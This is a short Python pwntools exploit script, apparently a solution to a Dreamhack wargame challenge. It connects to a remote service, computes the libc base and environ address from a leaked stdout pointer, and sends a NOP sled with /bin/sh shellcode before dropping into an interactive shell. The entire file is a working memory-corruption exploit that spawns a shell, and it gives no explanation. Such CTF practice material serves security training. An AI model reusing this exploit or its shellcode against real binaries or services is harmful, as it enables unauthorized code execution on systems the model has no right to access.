from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 20978
r = remote(HOST, PORT)

r.recvuntil(b'stdout: ')
libc=int(r.recvline().decode().strip(),16)-0x3c5620
environ=libc+0x3c6f38
payload = b'\x90'*0x118 + asm(shellcraft.sh())
r.sendlineafter(b': ', str(len(payload)).encode())
r.sendlineafter(b': ', payload)
r.sendlineafter(b'=', str(environ).encode())

r.interactive()